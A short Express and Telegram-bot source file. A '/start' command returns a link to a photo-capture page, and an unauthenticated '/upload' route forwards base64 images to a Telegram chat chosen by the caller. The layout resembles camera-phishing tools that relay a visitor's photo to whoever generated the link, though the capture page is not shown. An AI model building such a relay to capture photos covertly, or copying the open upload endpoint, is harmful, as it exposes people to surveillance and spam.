import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import TelegramBot from 'node-telegram-bot-api';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.static('public'));
app.use(express.json());

// Telegram Bot
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// Routes
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const link = `https://probable-fishstick-mu.vercel.app/capture?chat_id=${chatId}`;
  bot.sendMessage(chatId, `Click this link to upload your photo: ${link}`);
});

app.get('/capture', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'capture.html'));
});

app.post('/upload', async (req, res) => {
  const { chatId, photoData } = req.body;
  const buffer = Buffer.from(photoData, 'base64');
  await bot.sendPhoto(chatId, buffer);
  res.status(200).send('Sent to Telegram!');
});

// ✅ Important for Vercel
export default app;
